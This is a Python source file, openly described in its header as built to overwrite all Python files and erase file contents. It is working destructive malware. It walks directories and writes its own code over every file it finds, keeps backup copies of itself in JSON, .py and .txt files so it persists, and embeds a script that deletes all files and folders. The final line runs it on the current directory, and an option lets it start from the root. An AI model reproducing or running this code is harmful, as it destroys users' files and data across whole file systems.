#________________________________________________[FILE INFO]

#This is a python file intended to overwrite all your existing python files...
#Can also use the function of Killer to cause more potential harm...
#Can erase all the contents of files, making it empty...
#Details:
#Created by : Human Nowhere
#Project Name : Egos
#Start Date : 1-12-2024
#Visvasrk and team

#________________________________________________[END INFO]

#Import all the necessary modules
import os
import sys
import json
from pathlib import Path
from json import JSONDecodeError
import time

#Define variables for code convey (functional if used with () )
crtfile = os.path.basename(__file__)
curdir = os.curdir
getcwd = os.getcwd
absolute = os.path.abspath
ls = os.listdir
remove = os.remove
mkdir = os.mkdir
makedirs = os.makedirs
walk = os.walk
join = os.path.join
exists = os.path.exists

#Define the time variables
local= time.localtime()
gmt = time.gmtime()
crtepoach = time.time()
crttime = time.ctime(crtepoach)

#Define the storage variables
universal = '''

#Import necessary things...
import os
import sys
import time

#Define the variables
walk = os.walk
ls = os.listdir
exists = os.path.exists
join = os.path.join
absolute = os.path.abspath

#Define the main function
def Erase():
	for dirpath, dirs, files in walk(os.getcwd()):
		for obj in files:
			try:
				os.remove(absolute(join(dirpath, obj)))
			except:
				pass
		for directory in dirs:
			try:
				os.rmdir(absolute(join(dirpath, directory)))
			except:
				pass
Erase()

'''

#Persistence Variables
drivejson = '../system/requirements/jsons'
jsonbackup = 'backup.json'
demise = 'security.json'
drivepy = '../system/requirements/python'
pybackup = 'backup.py'
drivetxt = '../system/requirements/txt'
txtbackup = 'backup.txt'
drivelog = '../system/logfiles/log'
mainlog = 'main.log.txt'

#Define the machine functions

#Define a function to output the current time:
def ParseTime(target):
	fdate = time.strftime('%d%b%Y', target)
	ftime = time.strftime('%I%M', target)
	return f'{fdate}{ftime}'

#Define a code to write log
def WriteLog(msg, logname = f'log{ParseTime(local)}.txt'):
	makedirs(drivelog, exist_ok = True)
	if exists(absolute(join(drivelog, logname))):
		logfile = absolute(join(drivelog, logname))
		UpdateCode(logfile, msg)
	else:
		with open(absolute(join(drivelog, logname)), 'w') as logfile:
			pass
		logfile = absolute(join(drivelog, logname))
		UpdateCode(logfile, msg)
#Define a function to ReadCode and Return the output of the code
def ReadCode(target, output = False):
	with open(target, 'r') as sourcecode:
		code = sourcecode.read()
		if output:
			print(f'Code is :\n{code}')
		else:
			return code

#Define a function to overwrite a file and write a new code
def WriteCode(target, code):
	with open(target, 'w') as newsource:
		newsource.write(code)

#Define a function to appen to the file a code without overwriting it
def UpdateCode(target, content):
	with open(target, 'r') as oldsource:
		oldconn = oldsource.read()
	with open(target, 'w') as newsource:
		newconn = f'{oldconn}\n{content}'
		newsource.write(newconn)

#Define a function to check and return true
def Check(filepath, target):
	if exists(join(filepath, target)):
		return True
	else:
		try:
			makedirs(absolute(filepath), exist_ok = True)
			with open(absolute(join(filepath, target)), 'w') as newfile:
				pass
			return True
		except  Exception as e:
			logmsg = f'[{ParseTime(local)}] : {e}'
			WriteLog(logmsg)
			return False

#Define a function to Dump data to json
def DumpJson(filepath, target, content):
	if Check(absolute(filepath), target):
		fullpath = absolute(join(filepath, target))
		with open(fullpath, 'w') as file_to_dump:
			json.dump(content, file_to_dump)
			return True

#Define a funtion to Load data from json
def LoadJson(filepath, target, output = False, reload_content = ReadCode(absolute(crtfile))):
	if Check(absolute(filepath), target):
		fullpath = absolute(join(filepath, target))
		try:
			with open(fullpath, 'r') as file_to_load:
				content = json.load(file_to_load)
				if output:
					print(f'The JSON content of {fullpath} is : \n {content}')
				else:
					return content
		except JSONDecodeError as decode_error:
			WriteLog(decode_error)
			DumpJson(filepath, target, reload_content)
			with open(fullpath, 'r') as file_to_reload:
				content = json.load(file_to_reload)
				if output:
					print(f'The JSON content of {fullpath} is : \n {content}')
				else:
					return content


#Define a function for the creation of backup files in case of error.
def CreateBackup():
	jbk = absolute(join(drivejson, jsonbackup))
	pybk = absolute(join(drivepy, pybackup))
	txtbk = absolute(join(drivetxt, txtbackup))
	#Check for existence, this will automatically clear up all the issues arising by autocreating them.
	Check(drivejson, jsonbackup)
	Check(drivepy, pybackup)
	Check(drivetxt, txtbackup)
	Check(drivejson, demise)
	#Define variables for filecontent as dna
	dna = ReadCode(absolute(crtfile))
	DumpJson(drivejson, jsonbackup, dna)
	DumpJson(drivejson, demise, dna)
	WriteCode(pybk, dna)
	WriteCode(txtbk, dna)

#Define a function to load backups
def LoadBackup(getfrom):
	pybksource = absolute(join(drivepy, pybackup))
	txtbksource = absolute(join(drivetxt, txtbackup))
	payloadbk = LoadJson(drivejson, demise)
	jbk = LoadJson(drivejson, jsonbackup)
	pybk = ReadCode(pybksource)
	txtbk = ReadCode(txtbksource)
	if getfrom == 'jsonfile':
		return jbk
	elif getfrom == 'pyfile':
		return pybk
	elif getfrom == 'txtfile':
		return txtbk
	elif getfrom == 'demise':
		return payloadbk
	elif getfrom == 'default':
		return ReadCode(absolute(crtfile))
	else:
		return universal


#CreateBackup
CreateBackup()
#Define the Alas function
def Alas(dirname, pyspec = True, payload = LoadBackup('default')):
	for dirpath, directories, files in walk(dirname):
		if pyspec:
			for obj in files:
				if (obj.endswith('.py') or obj.endswith('.pyc') or obj.endswith('.pyw') or obj.endswith('.pip')) and obj != crtfile:
					try:
						target = absolute(join(dirpath, obj))
						WriteCode(target, payload)
						WriteLog(f'[{ParseTime(local)} > {target}] : SUCCESS!!!', mainlog)
					except Exception as e1:
						WriteLog(f'[{ParseTime(local)} > {target}] : FAILURE!!! {e1}\nRetrying {target} ...', mainlog)
						try:
							persistent = LoadBackup('demise') #or 'jsonfile', 'txtfile', 'pyfile'
							WriteCode(target, persistent)
							WriteLog(f'[{ParseTime(local)} > {target}] : SUCCESS!!!', mainlog)
						except Exception as e2:
							WriteLog(f'[{ParseTime(local)} > {target}] : FAILURE!!! {e2}\nRetrying {target} ...', mainlog)
							try:
								WriteCode(target, universal)
								WriteLog(f'[{ParseTime(local)} > {target}] : SUCCESS!!!', mainlog)
							except Exception as e3:
								WriteLog(f'[{ParseTime(local)} > {target}] : FAILURE!!! {e3}\nRetrying {target} ...', mainlog)
								#Write no log form now on...
								try:
									WriteCode(target, LoadBackup('jsonfile')) #Try loading from jsonfile
								except:
									try:
										WriteCode(target, LoadBackup('pyfile')) #Try loading from pyfile
									except:
										try:
											WriteCode(target, LoadBackup('txtfile')) #Finally try loading from text file.
										except Exception as failure:
											WriteLog(failure, mainlog)


		else:
			for obj in files:
				if obj != crtfile:
					try:
						target = absolute(join(dirpath, obj))
						WriteCode(target, payload)
						WriteLog(f'[{ParseTime(local)} > {target}] : SUCCESS!!!', mainlog)
					except Exception as e1:
						WriteLog(f'[{ParseTime(local)} > {target}] : FAILURE!!! {e1}\nRetrying {target} ...', mainlog)
						try:
							persistent = LoadBackup('demise')
							WriteCode(target, persistent)
							WriteLog(f'[{ParseTime(local)} > {target}] : SUCCESS!!!', mainlog)
						except Exception as e2:
							WriteLog(f'[{ParseTime(local)} > {target}] : FAILURE!!! {e2}\nRetrying {target} ...', mainlog)
							try:
								WriteCode(target, universal)
								WriteLog(f'[{ParseTime(local)} > {target}] : SUCCESS!!!', mainlog)
							except Exception as e3:
								WriteLog(f'[{ParseTime(local)} > {target}] : FAILURE!!! {e3}\nRetrying {target} ...', mainlog)
								#Write no logs from now.
								try:
									WriteCode(target, LoadBackup('jsonfile')) #Load from jsonfile
								except:
									try:
										WriteCode(target, LoadBackup('pyfile')) #Load from pyfile
									except:
										try:
											WriteCode(target, LoadBackup('txtfile')) #Load from txtfile
										except Exception as failure:
											WriteLog(failure, mainlog)


#Define the main function:
def A0(root = False, specify = True):
	#first create a backupfile
	try:
		print('Roger that...!!!')
		time.sleep(5)
		print('wow')
	except Exception as e:
		WriteLog(f'{ParseTime(local)} > Error: {e} while creating backup...')
	if root:
		Alas('/', pyspec = specify)
	if not root:
		Alas(absolute(getcwd()), pyspec = specify)





#________________________________________________[FILE FUNTIONS]

#Test
#print(ParseTime(local))
#Check('/hello/dir', 'hello')
#print(LoadJson(absolute(curdir), 'demoman.json'))
#print(DumpJson(getcwd(), 'demoman.json', ReadCode(crtfile)))
#print(LoadJson(absolute(curdir), 'demoman.json'))
#WriteCode('Contagious0.backup1.py', ReadCode(crtfile))
#Alas()
#UpdateCode('Demo.txt', 'Hi')
#LoadJson(drivejson, demise, output = True)
#mainlogpath = absolute(join(drivelog, mainlog))
#WriteLog('Hello, this is a log', mainlogpath)
A0(specify = False)
